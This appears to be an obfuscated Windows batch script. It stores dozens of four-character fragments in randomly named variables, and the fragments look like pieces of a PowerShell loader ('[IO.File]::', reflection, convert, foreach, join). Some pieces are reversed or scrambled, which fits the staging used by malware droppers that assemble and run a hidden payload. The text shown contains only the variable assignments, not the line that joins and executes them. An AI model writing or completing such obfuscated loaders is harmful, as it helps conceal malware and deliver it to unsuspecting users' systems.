@echo off
set "hmHtfrwpkv=..-1"
set "ilAkbXpsNx=1] -"
set "WwoAYjGnMR=fore"
set "NTRqExBsHw=flec"
set "vkXqlzAwcJ=File"
set "GVrsoJReoa=g = "
set "JbdzmOvOzm=0O+g"
set "iZaSOWBELi=[IO."
set "GEOfntHqPm=ay()"
set "jIppEhqYhr=stem"
set "VZXSSOlvhm=k; }"
set "sIEOUPwARC=$WXU"
set "HuyAWeSCJk=-joi"
set "oPdvOwJjwV=e]::"
set "hWNfWpNkpA=i, 0"
set "PUbgbQZPFk=GzVZ"
set "wNODzEJbOB=ose("
set "wUipdvqrgh=onve"
set "OEHFxHxFpe=nage"
set "qQqyRQbamS=in $"
set "BAltyFUQqe=gMod"
set "hXHKkZpGGm=ptog"
set "pwjHYrUJqj=gnir"
set "ygtgEpApqH=yste"
set "qYDxLmcNvA=; };"
set "gSJJKvJaQb=em.I"
set "mjTfyYUSQB=tion"
